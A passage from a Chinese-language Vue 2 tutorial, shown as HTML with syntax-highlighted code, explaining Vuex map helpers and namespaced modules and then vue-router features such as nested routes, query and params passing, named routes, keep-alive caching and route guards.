</code></pre></div></div></li><li><p>组件中读取数据：<code class="language-plaintext highlighter-rouge">$store.getters.bigSum</code></p></li></ol><h2 id="36-四个map方法的使用">3.6 四个map方法的使用</h2><ol><li><p><strong>mapState方法：</strong>用于帮助我们映射<code class="language-plaintext highlighter-rouge">state</code>中的数据为计算属性</p><div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">computed</span><span class="p">:</span> <span class="p">{</span>
    <span class="c1">//借助mapState生成计算属性：sum、school、subject（对象写法）</span>
     <span class="p">...</span><span class="nx">mapState</span><span class="p">({</span><span class="na">sum</span><span class="p">:</span><span class="dl">'</span><span class="s1">sum</span><span class="dl">'</span><span class="p">,</span><span class="na">school</span><span class="p">:</span><span class="dl">'</span><span class="s1">school</span><span class="dl">'</span><span class="p">,</span><span class="na">subject</span><span class="p">:</span><span class="dl">'</span><span class="s1">subject</span><span class="dl">'</span><span class="p">}),</span>
            
    <span class="c1">//借助mapState生成计算属性：sum、school、subject（数组写法）</span>
    <span class="p">...</span><span class="nx">mapState</span><span class="p">([</span><span class="dl">'</span><span class="s1">sum</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">school</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">subject</span><span class="dl">'</span><span class="p">]),</span>
<span class="p">},</span>
</code></pre></div></div></li><li><p><strong>mapGetters方法：</strong>用于帮助我们映射<code class="language-plaintext highlighter-rouge">getters</code>中的数据为计算属性</p><div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">computed</span><span class="p">:</span> <span class="p">{</span>
    <span class="c1">//借助mapGetters生成计算属性：bigSum（对象写法）</span>
    <span class="p">...</span><span class="nx">mapGetters</span><span class="p">({</span><span class="na">bigSum</span><span class="p">:</span><span class="dl">'</span><span class="s1">bigSum</span><span class="dl">'</span><span class="p">}),</span>
   
    <span class="c1">//借助mapGetters生成计算属性：bigSum（数组写法）</span>
    <span class="p">...</span><span class="nx">mapGetters</span><span class="p">([</span><span class="dl">'</span><span class="s1">bigSum</span><span class="dl">'</span><span class="p">])</span>
<span class="p">},</span>
</code></pre></div></div></li><li><p><strong>mapActions方法：</strong>用于帮助我们生成与<code class="language-plaintext highlighter-rouge">actions</code>对话的方法，即：包含<code class="language-plaintext highlighter-rouge">$store.dispatch(xxx)</code>的函数</p><div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">methods</span><span class="p">:{</span>
    <span class="c1">//靠mapActions生成：incrementOdd、incrementWait（对象形式）</span>
    <span class="p">...</span><span class="nx">mapActions</span><span class="p">({</span><span class="na">incrementOdd</span><span class="p">:</span><span class="dl">'</span><span class="s1">jiaOdd</span><span class="dl">'</span><span class="p">,</span><span class="na">incrementWait</span><span class="p">:</span><span class="dl">'</span><span class="s1">jiaWait</span><span class="dl">'</span><span class="p">})</span>
   
    <span class="c1">//靠mapActions生成：incrementOdd、incrementWait（数组形式）</span>
    <span class="p">...</span><span class="nx">mapActions</span><span class="p">([</span><span class="dl">'</span><span class="s1">jiaOdd</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">jiaWait</span><span class="dl">'</span><span class="p">])</span>
<span class="p">}</span>
</code></pre></div></div></li><li><p><strong>mapMutations方法：</strong>用于帮助我们生成与<code class="language-plaintext highlighter-rouge">mutations</code>对话的方法，即：包含<code class="language-plaintext highlighter-rouge">$store.commit(xxx)</code>的函数</p><div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">methods</span><span class="p">:{</span>
    <span class="c1">//靠mapActions生成：increment、decrement（对象形式）</span>
    <span class="p">...</span><span class="nx">mapMutations</span><span class="p">({</span><span class="na">increment</span><span class="p">:</span><span class="dl">'</span><span class="s1">JIA</span><span class="dl">'</span><span class="p">,</span><span class="na">decrement</span><span class="p">:</span><span class="dl">'</span><span class="s1">JIAN</span><span class="dl">'</span><span class="p">}),</span>
       
    <span class="c1">//靠mapMutations生成：JIA、JIAN（对象形式）</span>
    <span class="p">...</span><span class="nx">mapMutations</span><span class="p">([</span><span class="dl">'</span><span class="s1">JIA</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">JIAN</span><span class="dl">'</span><span class="p">]),</span>
<span class="p">}</span>
</code></pre></div></div></li></ol><blockquote><p>备注：mapActions与mapMutations使用时，若需要传递参数需要：在模板中绑定事件时传递好参数，否则参数是事件对象。</p></blockquote><h2 id="37-模块化命名空间">3.7 模块化+命名空间</h2><ol><li><p>目的：让代码更好维护，让多种数据分类更加明确。</p></li><li><p>修改<code class="language-plaintext highlighter-rouge">store.js</code></p><div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">countAbout</span> <span class="o">=</span> <span class="p">{</span>
  <span class="na">namespaced</span><span class="p">:</span><span class="kc">true</span><span class="p">,</span><span class="c1">//开启命名空间</span>
  <span class="na">state</span><span class="p">:{</span><span class="na">x</span><span class="p">:</span><span class="mi">1</span><span class="p">},</span>
  <span class="na">mutations</span><span class="p">:</span> <span class="p">{</span> <span class="p">...</span> <span class="p">},</span>
  <span class="na">actions</span><span class="p">:</span> <span class="p">{</span> <span class="p">...</span> <span class="p">},</span>
  <span class="na">getters</span><span class="p">:</span> <span class="p">{</span>
    <span class="nx">bigSum</span><span class="p">(</span><span class="nx">state</span><span class="p">){</span>
       <span class="k">return</span> <span class="nx">state</span><span class="p">.</span><span class="nx">sum</span> <span class="o">*</span> <span class="mi">10</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">}</span>
   
<span class="kd">const</span> <span class="nx">personAbout</span> <span class="o">=</span> <span class="p">{</span>
  <span class="na">namespaced</span><span class="p">:</span><span class="kc">true</span><span class="p">,</span><span class="c1">//开启命名空间</span>
  <span class="na">state</span><span class="p">:{</span> <span class="p">...</span> <span class="p">},</span>
  <span class="na">mutations</span><span class="p">:</span> <span class="p">{</span> <span class="p">...</span> <span class="p">},</span>
  <span class="na">actions</span><span class="p">:</span> <span class="p">{</span> <span class="p">...</span> <span class="p">}</span>
<span class="p">}</span>
   
<span class="kd">const</span> <span class="nx">store</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Vuex</span><span class="p">.</span><span class="nx">Store</span><span class="p">({</span>
  <span class="na">modules</span><span class="p">:</span> <span class="p">{</span>
    <span class="nx">countAbout</span><span class="p">,</span>
    <span class="nx">personAbout</span>
  <span class="p">}</span>
<span class="p">})</span>
</code></pre></div></div></li><li><p>开启命名空间后，组件中读取state数据：</p><div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//方式一：自己直接读取</span>
<span class="k">this</span><span class="p">.</span><span class="nx">$store</span><span class="p">.</span><span class="nx">state</span><span class="p">.</span><span class="nx">personAbout</span><span class="p">.</span><span class="nx">list</span>
<span class="c1">//方式二：借助mapState读取：</span>
<span class="p">...</span><span class="nx">mapState</span><span class="p">(</span><span class="dl">'</span><span class="s1">countAbout</span><span class="dl">'</span><span class="p">,[</span><span class="dl">'</span><span class="s1">sum</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">school</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">subject</span><span class="dl">'</span><span class="p">]),</span>
</code></pre></div></div></li><li><p>开启命名空间后，组件中读取getters数据：</p><div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//方式一：自己直接读取</span>
<span class="k">this</span><span class="p">.</span><span class="nx">$store</span><span class="p">.</span><span class="nx">getters</span><span class="p">[</span><span class="dl">'</span><span class="s1">personAbout/firstPersonName</span><span class="dl">'</span><span class="p">]</span>
<span class="c1">//方式二：借助mapGetters读取：</span>
<span class="p">...</span><span class="nx">mapGetters</span><span class="p">(</span><span class="dl">'</span><span class="s1">countAbout</span><span class="dl">'</span><span class="p">,[</span><span class="dl">'</span><span class="s1">bigSum</span><span class="dl">'</span><span class="p">])</span>
</code></pre></div></div></li><li><p>开启命名空间后，组件中调用dispatch</p><div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//方式一：自己直接dispatch</span>
<span class="k">this</span><span class="p">.</span><span class="nx">$store</span><span class="p">.</span><span class="nx">dispatch</span><span class="p">(</span><span class="dl">'</span><span class="s1">personAbout/addPersonWang</span><span class="dl">'</span><span class="p">,</span><span class="nx">person</span><span class="p">)</span>
<span class="c1">//方式二：借助mapActions：</span>
<span class="p">...</span><span class="nx">mapActions</span><span class="p">(</span><span class="dl">'</span><span class="s1">countAbout</span><span class="dl">'</span><span class="p">,{</span><span class="na">incrementOdd</span><span class="p">:</span><span class="dl">'</span><span class="s1">jiaOdd</span><span class="dl">'</span><span class="p">,</span><span class="na">incrementWait</span><span class="p">:</span><span class="dl">'</span><span class="s1">jiaWait</span><span class="dl">'</span><span class="p">})</span>
</code></pre></div></div></li><li><p>开启命名空间后，组件中调用commit</p><div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//方式一：自己直接commit</span>
<span class="k">this</span><span class="p">.</span><span class="nx">$store</span><span class="p">.</span><span class="nx">commit</span><span class="p">(</span><span class="dl">'</span><span class="s1">personAbout/ADD_PERSON</span><span class="dl">'</span><span class="p">,</span><span class="nx">person</span><span class="p">)</span>
<span class="c1">//方式二：借助mapMutations：</span>
<span class="p">...</span><span class="nx">mapMutations</span><span class="p">(</span><span class="dl">'</span><span class="s1">countAbout</span><span class="dl">'</span><span class="p">,{</span><span class="na">increment</span><span class="p">:</span><span class="dl">'</span><span class="s1">JIA</span><span class="dl">'</span><span class="p">,</span><span class="na">decrement</span><span class="p">:</span><span class="dl">'</span><span class="s1">JIAN</span><span class="dl">'</span><span class="p">}),</span>
</code></pre></div></div></li></ol><h1 id="4-路由">4. 路由</h1><ol><li>理解： 一个路由（route）就是一组映射关系（key - value），多个路由需要路由器（router）进行管理。</li><li>前端路由：key是路径，value是组件。</li></ol><h2 id="41-基本使用">4.1 基本使用</h2><ol><li><p>安装vue-router，命令：<code class="language-plaintext highlighter-rouge">npm i vue-router</code></p></li><li><p>应用插件：<code class="language-plaintext highlighter-rouge">Vue.use(VueRouter)</code></p></li><li><p>编写router配置项:</p><div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//引入VueRouter</span>
<span class="k">import</span> <span class="nx">VueRouter</span> <span class="k">from</span> <span class="dl">'</span><span class="s1">vue-router</span><span class="dl">'</span>
<span class="c1">//引入Luyou 组件</span>
<span class="k">import</span> <span class="nx">About</span> <span class="k">from</span> <span class="dl">'</span><span class="s1">../components/About</span><span class="dl">'</span>
<span class="k">import</span> <span class="nx">Home</span> <span class="k">from</span> <span class="dl">'</span><span class="s1">../components/Home</span><span class="dl">'</span>
   
<span class="c1">//创建router实例对象，去管理一组一组的路由规则</span>
<span class="kd">const</span> <span class="nx">router</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">VueRouter</span><span class="p">({</span>
	<span class="na">routes</span><span class="p">:[</span>
		<span class="p">{</span>
			<span class="na">path</span><span class="p">:</span><span class="dl">'</span><span class="s1">/about</span><span class="dl">'</span><span class="p">,</span>
			<span class="na">component</span><span class="p">:</span><span class="nx">About</span>
		<span class="p">},</span>
		<span class="p">{</span>
			<span class="na">path</span><span class="p">:</span><span class="dl">'</span><span class="s1">/home</span><span class="dl">'</span><span class="p">,</span>
			<span class="na">component</span><span class="p">:</span><span class="nx">Home</span>
		<span class="p">}</span>
	<span class="p">]</span>
<span class="p">})</span>
   
<span class="c1">//暴露router</span>
<span class="k">export</span> <span class="k">default</span> <span class="nx">router</span>
</code></pre></div></div></li><li><p>实现切换（active-class可配置高亮样式）</p><div class="language-vue highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;router-link</span> <span class="na">active-class=</span><span class="s">"active"</span> <span class="na">to=</span><span class="s">"/about"</span><span class="nt">&gt;</span>About<span class="nt">&lt;/router-link&gt;</span>
</code></pre></div></div></li><li><p>指定展示位置</p><div class="language-vue highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;router-view&gt;&lt;/router-view&gt;</span>
</code></pre></div></div></li></ol><h2 id="42-几个注意点">4.2 几个注意点</h2><ol><li>路由组件通常存放在<code class="language-plaintext highlighter-rouge">pages</code>文件夹，一般组件通常存放在<code class="language-plaintext highlighter-rouge">components</code>文件夹。</li><li>通过切换，“隐藏”了的路由组件，默认是被销毁掉的，需要的时候再去挂载。</li><li>每个组件都有自己的<code class="language-plaintext highlighter-rouge">$route</code>属性，里面存储着自己的路由信息。</li><li>整个应用只有一个router，可以通过组件的<code class="language-plaintext highlighter-rouge">$router</code>属性获取到。</li></ol><h2 id="43-多级路由多级路由">4.3 多级路由（多级路由）</h2><ol><li><p>配置路由规则，使用children配置项：</p><div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">routes</span><span class="p">:[</span>
	<span class="p">{</span>
		<span class="na">path</span><span class="p">:</span><span class="dl">'</span><span class="s1">/about</span><span class="dl">'</span><span class="p">,</span>
		<span class="na">component</span><span class="p">:</span><span class="nx">About</span><span class="p">,</span>
	<span class="p">},</span>
	<span class="p">{</span>
		<span class="na">path</span><span class="p">:</span><span class="dl">'</span><span class="s1">/home</span><span class="dl">'</span><span class="p">,</span>
		<span class="na">component</span><span class="p">:</span><span class="nx">Home</span><span class="p">,</span>
		<span class="na">children</span><span class="p">:[</span> <span class="c1">//通过children配置子级路由</span>
			<span class="p">{</span>
				<span class="na">path</span><span class="p">:</span><span class="dl">'</span><span class="s1">news</span><span class="dl">'</span><span class="p">,</span> <span class="c1">//此处一定不要写：/news</span>
				<span class="na">component</span><span class="p">:</span><span class="nx">News</span>
			<span class="p">},</span>
			<span class="p">{</span>
				<span class="na">path</span><span class="p">:</span><span class="dl">'</span><span class="s1">message</span><span class="dl">'</span><span class="p">,</span><span class="c1">//此处一定不要写：/message</span>
				<span class="na">component</span><span class="p">:</span><span class="nx">Message</span>
			<span class="p">}</span>
		<span class="p">]</span>
	<span class="p">}</span>
<span class="p">]</span>
</code></pre></div></div></li><li><p>跳转（要写完整路径）：</p><div class="language-vue highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;router-link</span> <span class="na">to=</span><span class="s">"/home/news"</span><span class="nt">&gt;</span>News<span class="nt">&lt;/router-link&gt;</span>
</code></pre></div></div></li><li><p>指定展示位置</p><div class="language-vue highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;router-view&gt;&lt;/router-view&gt;</span>
</code></pre></div></div></li></ol><h2 id="44-路由的query参数">4.4 路由的query参数</h2><ol><li><p>传递参数</p><div class="language-vue highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!-- 跳转并携带query参数，to的字符串写法 --&gt;</span>
<span class="nt">&lt;router-link</span> <span class="na">:to=</span><span class="s">"/home/message/detail?id=666&amp;title=你好"</span><span class="nt">&gt;</span>跳转<span class="nt">&lt;/router-link&gt;</span>
   				
<span class="c">&lt;!-- 跳转并携带query参数，to的对象写法 --&gt;</span>
<span class="nt">&lt;router-link</span> 
	<span class="na">:to=</span><span class="s">"{
		path:'/home/message/detail',
		query:{
		   id:666,
            title:'你好'
		}
	}"</span>
<span class="nt">&gt;</span>跳转<span class="nt">&lt;/router-link&gt;</span>
</code></pre></div></div></li><li><p>接收参数：</p><div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">$route</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">id</span>
<span class="nx">$route</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">title</span>
</code></pre></div></div></li></ol><h2 id="45-命名路由">4.5 命名路由</h2><ol><li><p>作用：可以简化路由的跳转。</p></li><li><p>如何使用</p><ol><li><p>给路由命名：</p><div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span>
	<span class="nl">path</span><span class="p">:</span><span class="dl">'</span><span class="s1">/demo</span><span class="dl">'</span><span class="p">,</span>
	<span class="nx">component</span><span class="p">:</span><span class="nx">Demo</span><span class="p">,</span>
	<span class="nx">children</span><span class="p">:[</span>
		<span class="p">{</span>
			<span class="na">path</span><span class="p">:</span><span class="dl">'</span><span class="s1">test</span><span class="dl">'</span><span class="p">,</span>
			<span class="na">component</span><span class="p">:</span><span class="nx">Test</span><span class="p">,</span>
			<span class="na">children</span><span class="p">:[</span>
				<span class="p">{</span>
                      <span class="na">name</span><span class="p">:</span><span class="dl">'</span><span class="s1">hello</span><span class="dl">'</span> <span class="c1">//给路由命名</span>
					<span class="na">path</span><span class="p">:</span><span class="dl">'</span><span class="s1">welcome</span><span class="dl">'</span><span class="p">,</span>
					<span class="na">component</span><span class="p">:</span><span class="nx">Hello</span><span class="p">,</span>
				<span class="p">}</span>
			<span class="p">]</span>
		<span class="p">}</span>
	<span class="p">]</span>
<span class="p">}</span>
</code></pre></div></div></li><li><p>简化跳转：</p><div class="language-vue highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!--简化前，需要写完整的路径 --&gt;</span>
<span class="nt">&lt;router-link</span> <span class="na">to=</span><span class="s">"/demo/test/welcome"</span><span class="nt">&gt;</span>跳转<span class="nt">&lt;/router-link&gt;</span>
      
<span class="c">&lt;!--简化后，直接通过名字跳转 --&gt;</span>
<span class="nt">&lt;router-link</span> <span class="na">:to=</span><span class="s">"{name:'hello'}"</span><span class="nt">&gt;</span>跳转<span class="nt">&lt;/router-link&gt;</span>
      
<span class="c">&lt;!--简化写法配合传递参数 --&gt;</span>
<span class="nt">&lt;router-link</span> 
	<span class="na">:to=</span><span class="s">"{
		name:'hello',
		query:{
		   id:666,
            title:'你好'
		}
	}"</span>
<span class="nt">&gt;</span>跳转<span class="nt">&lt;/router-link&gt;</span>
</code></pre></div></div></li></ol></li></ol><h2 id="46-路由的params参数">4.6 路由的params参数</h2><ol><li><p>配置路由，声明接收params参数</p><div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span>
	<span class="nl">path</span><span class="p">:</span><span class="dl">'</span><span class="s1">/home</span><span class="dl">'</span><span class="p">,</span>
	<span class="nx">component</span><span class="p">:</span><span class="nx">Home</span><span class="p">,</span>
	<span class="nx">children</span><span class="p">:[</span>
		<span class="p">{</span>
			<span class="na">path</span><span class="p">:</span><span class="dl">'</span><span class="s1">news</span><span class="dl">'</span><span class="p">,</span>
			<span class="na">component</span><span class="p">:</span><span class="nx">News</span>
		<span class="p">},</span>
		<span class="p">{</span>
			<span class="na">component</span><span class="p">:</span><span class="nx">Message</span><span class="p">,</span>
			<span class="na">children</span><span class="p">:[</span>
				<span class="p">{</span>
					<span class="na">name</span><span class="p">:</span><span class="dl">'</span><span class="s1">xiangqing</span><span class="dl">'</span><span class="p">,</span>
					<span class="na">path</span><span class="p">:</span><span class="dl">'</span><span class="s1">detail/:id/:title</span><span class="dl">'</span><span class="p">,</span> <span class="c1">//使用占位符声明接收params参数</span>
					<span class="na">component</span><span class="p">:</span><span class="nx">Detail</span>
				<span class="p">}</span>
			<span class="p">]</span>
		<span class="p">}</span>
	<span class="p">]</span>
<span class="p">}</span>
</code></pre></div></div></li><li><p>传递参数</p><div class="language-vue highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!-- 跳转并携带params参数，to的字符串写法 --&gt;</span>
<span class="nt">&lt;router-link</span> <span class="na">:to=</span><span class="s">"/home/message/detail/666/你好"</span><span class="nt">&gt;</span>跳转<span class="nt">&lt;/router-link&gt;</span>
   				
<span class="c">&lt;!-- 跳转并携带params参数，to的对象写法 --&gt;</span>
<span class="nt">&lt;router-link</span> 
	<span class="na">:to=</span><span class="s">"{
		name:'xiangqing',
		params:{
		   id:666,
            title:'你好'
		}
	}"</span>
<span class="nt">&gt;</span>跳转<span class="nt">&lt;/router-link&gt;</span>
</code></pre></div></div><blockquote><p>特别注意：路由携带params参数时，若使用to的对象写法，则不能使用path配置项，必须使用name配置！</p></blockquote></li><li><p>接收参数：</p><div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">$route</span><span class="p">.</span><span class="nx">params</span><span class="p">.</span><span class="nx">id</span>
<span class="nx">$route</span><span class="p">.</span><span class="nx">params</span><span class="p">.</span><span class="nx">title</span>
</code></pre></div></div></li></ol><h2 id="47-路由的props配置">4.7 路由的props配置</h2><p>作用：让路由组件更方便的收到参数</p><div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span>
	<span class="nl">name</span><span class="p">:</span><span class="dl">'</span><span class="s1">xiangqing</span><span class="dl">'</span><span class="p">,</span>
	<span class="nx">path</span><span class="p">:</span><span class="dl">'</span><span class="s1">detail/:id</span><span class="dl">'</span><span class="p">,</span>
	<span class="nx">component</span><span class="p">:</span><span class="nx">Detail</span><span class="p">,</span>

	<span class="c1">//第一种写法：props值为对象，该对象中所有的key-value的组合最终都会通过props传给Detail组件</span>
	<span class="c1">// props:{a:900}</span>

	<span class="c1">//第二种写法：props值为布尔值，布尔值为true，则把路由收到的所有params参数通过props传给Detail组件</span>
	<span class="c1">// props:true</span>
	
	<span class="c1">//第三种写法：props值为函数，该函数返回的对象中每一组key-value都会通过props传给Detail组件</span>
	<span class="nx">props</span><span class="p">(</span><span class="nx">route</span><span class="p">){</span>
		<span class="k">return</span> <span class="p">{</span>
			<span class="na">id</span><span class="p">:</span><span class="nx">route</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">id</span><span class="p">,</span>
			<span class="na">title</span><span class="p">:</span><span class="nx">route</span><span class="p">.</span><span class="nx">query</span><span class="p">.</span><span class="nx">title</span>
		<span class="p">}</span>
	<span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div><h2 id="48-router-link的replace属性">4.8 <code class="language-plaintext highlighter-rouge">&lt;router-link&gt;</code>的replace属性</h2><ol><li>作用：控制路由跳转时操作浏览器历史记录的模式</li><li>浏览器的历史记录有两种写入方式：分别为<code class="language-plaintext highlighter-rouge">push</code>和<code class="language-plaintext highlighter-rouge">replace</code>，<code class="language-plaintext highlighter-rouge">push</code>是追加历史记录，<code class="language-plaintext highlighter-rouge">replace</code>是替换当前记录。路由跳转时候默认为<code class="language-plaintext highlighter-rouge">push</code></li><li>如何开启<code class="language-plaintext highlighter-rouge">replace</code>模式：<code class="language-plaintext highlighter-rouge">&lt;router-link replace .......&gt;News&lt;/router-link&gt;</code></li></ol><h2 id="49-编程式路由导航">4.9 编程式路由导航</h2><ol><li><p>作用：不借助<code class="language-plaintext highlighter-rouge">&lt;router-link&gt;</code>实现路由跳转，让路由跳转更加灵活</p></li><li><p>具体编码：</p><div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//$router的两个API</span>
<span class="k">this</span><span class="p">.</span><span class="nx">$router</span><span class="p">.</span><span class="nx">push</span><span class="p">({</span>
	<span class="na">name</span><span class="p">:</span><span class="dl">'</span><span class="s1">xiangqing</span><span class="dl">'</span><span class="p">,</span>
		<span class="na">params</span><span class="p">:{</span>
			<span class="na">id</span><span class="p">:</span><span class="nx">xxx</span><span class="p">,</span>
			<span class="na">title</span><span class="p">:</span><span class="nx">xxx</span>
		<span class="p">}</span>
<span class="p">})</span>
   
<span class="k">this</span><span class="p">.</span><span class="nx">$router</span><span class="p">.</span><span class="nx">replace</span><span class="p">({</span>
	<span class="na">name</span><span class="p">:</span><span class="dl">'</span><span class="s1">xiangqing</span><span class="dl">'</span><span class="p">,</span>
		<span class="na">params</span><span class="p">:{</span>
			<span class="na">id</span><span class="p">:</span><span class="nx">xxx</span><span class="p">,</span>
			<span class="na">title</span><span class="p">:</span><span class="nx">xxx</span>
		<span class="p">}</span>
<span class="p">})</span>
<span class="k">this</span><span class="p">.</span><span class="nx">$router</span><span class="p">.</span><span class="nx">forward</span><span class="p">()</span> <span class="c1">//前进</span>
<span class="k">this</span><span class="p">.</span><span class="nx">$router</span><span class="p">.</span><span class="nx">back</span><span class="p">()</span> <span class="c1">//后退</span>
<span class="k">this</span><span class="p">.</span><span class="nx">$router</span><span class="p">.</span><span class="nx">go</span><span class="p">()</span> <span class="c1">//可前进也可后退</span>
</code></pre></div></div></li></ol><h2 id="410-缓存路由组件">4.10 缓存路由组件</h2><ol><li><p>作用：让不展示的路由组件保持挂载，不被销毁。</p></li><li><p>具体编码：</p><p>这个 include 指的是组件名</p><div class="language-vue highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;keep-alive</span> <span class="na">include=</span><span class="s">"News"</span><span class="nt">&gt;</span> 
    <span class="nt">&lt;router-view&gt;&lt;/router-view&gt;</span>
<span class="nt">&lt;/keep-alive&gt;</span>
</code></pre></div></div></li></ol><h2 id="411-两个新的生命周期钩子">4.11 两个新的生命周期钩子</h2><ol><li>作用：路由组件所独有的两个钩子，用于捕获路由组件的激活状态。</li><li>具体名字：<ol><li><code class="language-plaintext highlighter-rouge">activated</code>路由组件被激活时触发。</li><li><code class="language-plaintext highlighter-rouge">deactivated</code>路由组件失活时触发。</li></ol></li></ol><h2 id="412-路由守卫">4.12 路由守卫</h2><ol><li><p>作用：对路由进行权限控制</p></li><li><p>分类：全局守卫、独享守卫、组件内守卫</p></li><li><p>全局守卫:</p><div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//全局前置守卫：初始化时执行、每次路由切换前执行</span>
<span class="nx">router</span><span class="p">.</span><span class="nx">beforeEach</span><span class="p">((</span><span class="nx">to</span><span class="p">,</span><span class="k">from</span><span class="p">,</span><span class="nx">next</span><span class="p">)</span><span class="o">=&gt;</span><span class="p">{</span>
	<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">beforeEach</span><span class="dl">'</span><span class="p">,</span><span class="nx">to</span><span class="p">,</span><span class="k">from</span><span class="p">)</span>
	<span class="k">if</span><span class="p">(</span><span class="nx">to</span><span class="p">.</span><span class="nx">meta</span><span class="p">.</span><span class="nx">isAuth</span><span class="p">){</span> <span class="c1">//判断当前路由是否需要进行权限控制</span>
		<span class="k">if</span><span class="p">(</span><span class="nx">localStorage</span><span class="p">.</span><span class="nx">getItem</span><span class="p">(</span><span class="dl">'</span><span class="s1">school</span><span class="dl">'</span><span class="p">)</span> <span class="o">===</span> <span class="dl">'</span><span class="s1">atguigu</span><span class="dl">'</span><span class="p">){</span> <span class="c1">//权限控制的具体规则</span>
			<span class="nx">next</span><span class="p">()</span> <span class="c1">//放行</span>
		<span class="p">}</span><span class="k">else</span><span class="p">{</span>
			<span class="nx">alert</span><span class="p">(</span><span class="dl">'</span><span class="s1">暂无权限查看</span><span class="dl">'</span><span class="p">)</span>
			<span class="c1">// next({name:'guanyu'})</span>
		<span class="p">}</span>
	<span class="p">}</span><span class="k">else</span><span class="p">{</span>
		<span class="nx">next</span><span class="p">()</span> <span class="c1">//放行</span>
	<span class="p">}</span>
<span class="p">})</span>
   
<span class="c1">//全局后置守卫：初始化时执行、每次路由切换后执行</span>
<span class="nx">router</span><span class="p">.</span><span class="nx">afterEach</span><span class="p">((</span><span class="nx">to</span><span class="p">,</span><span class="k">from</span><span class="p">)</span><span class="o">=&gt;</span><span class="p">{</span>
	<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">afterEach</span><span class="dl">'</span><span class="p">,</span><span class="nx">to</span><span class="p">,</span><span class="k">from</span><span class="p">)</span>
	<span class="k">if</span><span class="p">(</span><span class="nx">to</span><span class="p">.</span><span class="nx">meta</span><span class="p">.</span><span class="nx">title</span><span class="p">){</span> 
		<span class="nb">document</span><span class="p">.</span><span class="nx">title</span> <span class="o">=</span> <span class="nx">to</span><span class="p">.</span><span class="nx">meta</span><span class="p">.</span><span class="nx">title</span> <span class="c1">//修改网页的title</span>
	<span class="p">}</span><span class="k">else</span><span class="p">{</span>
		<span class="nb">document</span><span class="p">.</span><span class="nx">title</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">vue_test</span><span class="dl">'</span>
	<span class="p">}</span>
<span class="p">})</span>
</code></pre></div></div></li><li><p>独享守卫:</p><div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">beforeEnter</span><span class="p">(</span><span class="nx">to</span><span class="p">,</span><span class="k">from</span><span class="p">,</span><span class="nx">next</span><span class="p">){</span>
	<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">beforeEnter</span><span class="dl">'</span><span class="p">,</span><span class="nx">to</span><span class="p">,</span><span class="k">from</span><span class="p">)</span>
	<span class="k">if</span><span class="p">(</span><span class="nx">to</span><span class="p">.</span><span class="nx">meta</span><span class="p">.</span><span class="nx">isAuth</span><span class="p">){</span> <span class="c1">//判断当前路由是否需要进行权限控制</span>
		<span class="k">if</span><span class="p">(</span><span class="nx">localStorage</span><span class="p">.</span><span class="nx">getItem</span><span class="p">(</span><span class="dl">'</span><span class="s1">school</span><span class="dl">'</span><span class="p">)</span> <span class="o">===</span> <span class="dl">'</span><span class="s1">atguigu</span><span class="dl">'</span><span class="p">){</span>
			<span class="nx">next</span><span class="p">()</span>
		<span class="p">}</span><span class="k">else</span><span class="p">{</span>
			<span class="nx">alert</span><span class="p">(</span><span class="dl">'</span><span class="s1">暂无权限查看</span><span class="dl">'</span><span class="p">)</span>
			<span class="c1">// next({name:'guanyu'})</span>
		<span class="p">}</span>
	<span class="p">}</span><span class="k">else</span><span class="p">{</span>
		<span class="nx">next</span><span class="p">()</span>
	<span class="p">}</span>
<span class="p">}</span>
